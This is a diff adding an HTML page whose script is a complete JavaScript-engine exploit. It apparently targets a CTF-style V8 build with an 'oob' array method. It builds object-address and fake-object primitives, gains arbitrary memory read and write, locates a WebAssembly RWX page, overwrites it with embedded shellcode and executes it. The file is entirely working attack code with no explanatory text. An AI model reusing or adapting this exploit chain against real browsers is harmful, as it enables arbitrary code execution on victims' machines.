@@ -1,0 +1,109 @@
+<script>
+
+var buf = new ArrayBuffer(16);
+var float64 = new Float64Array(buf);
+var bigUint64 = new BigUint64Array(buf);
+
+function f2i( f ) {
+    float64[0] = f;
+    return bigUint64[0];
+}
+function i2f( i ) {
+    bigUint64[0] = i;
+    return float64[0];
+}
+function hex( x ) {
+    return x.toString(16).padStart(16, "0");
+}
+
+
+
+var obj = {};
+var obj_list = [obj];
+var float_list = [4.3];
+
+var obj_map = obj_list.oob();
+var float_map = float_list.oob();
+
+
+
+function get_addr( target_obj ) {
+    obj_list[0] = target_obj;
+    obj_list.oob(float_map);
+    let res = f2i(obj_list[0]) - 1n;
+    obj_list.oob(obj_map);
+    return res;
+}
+function get_obj( target_addr ) {
+    float_list[0] = i2f(target_addr + 1n);
+    float_list.oob(obj_map);
+    let res = float_list[0];
+    float_list.oob(float_map);
+    return res;
+}
+
+var fake_float_array = [
+    float_map, 
+    i2f(0n), 
+    i2f(0xdeadbeefn), 
+    i2f(0x400000000n),
+    4.3, 
+    4.3
+];
+var fake_array_addr = get_addr(fake_float_array);
+var fake_elements_addr = fake_array_addr - 0x30n;
+var fake_obj = get_obj(fake_elements_addr);
+
+function arb_read( target_addr ) {
+    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
+    let res = f2i(fake_obj[0]);
+    console.log("[SUCCESS] data from 0x" + hex(target_addr) + " is: 0x" + hex(res));
+    return res;
+}
+function arb_write( target_addr, data ) {
+    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
+    fake_obj[0] = i2f(data);
+    console.log("[SUCCESS] written to 0x" + hex(target_addr) + " with: 0x" + hex(data));
+}
+
+var data_buf = new ArrayBuffer(8);
+var data_view = new DataView(data_buf);
+var buf_backing_store_addr = get_addr(data_buf) + 0x20n;
+function writeDataview(addr,data){
+    arb_write(buf_backing_store_addr, addr);
+    data_view.setBigUint64(0, data, true);
+    console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));
+}
+
+
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+var exp = wasmInstance.exports.main;
+var exp_addr = get_addr(exp);
+console.log("[+] Addr of exp:  0x" + hex(exp_addr));
+
+var shared_info_addr = arb_read(exp_addr + 0x18n) - 0x1n;
+var wasm_exported_func_data_addr = arb_read(shared_info_addr + 0x8n) - 0x1n;
+var wasm_instance_addr = arb_read(wasm_exported_func_data_addr + 0x10n) - 0x1n;
+var rwx_page_addr = arb_read(wasm_instance_addr + 0x88n);
+console.log("[*] leak rwx_segment_addr: 0x" + hex(rwx_page_addr));
+
+var sc_arr = [
+    0x10101010101b848n,    0x62792eb848500101n,    0x431480101626d60n,    0x2f7273752fb84824n,
+    0x48e78948506e6962n,    0x1010101010101b8n,    0x6d606279b8485001n,    0x2404314801010162n,
+    0x1485e086a56f631n,    0x303a68e6894856e6n,    0x50534944b848302en,    0x52d231503d59414cn,
+    0x4852e201485a086an,    0x50f583b6ae289n,
+];
+
+var buffer = new ArrayBuffer(sc_arr.length * 8 + 8);
+var data_view = new DataView(buffer);
+var buf_backing_store_addr = get_addr(buffer) + 0x20n;
+
+arb_write(buf_backing_store_addr, rwx_page_addr);
+for (let i = 0; i < sc_arr.length; i++){
+    data_view.setFloat64(i * 8, i2f(sc_arr[i]), true);
+}
+
+exp();
+</script>
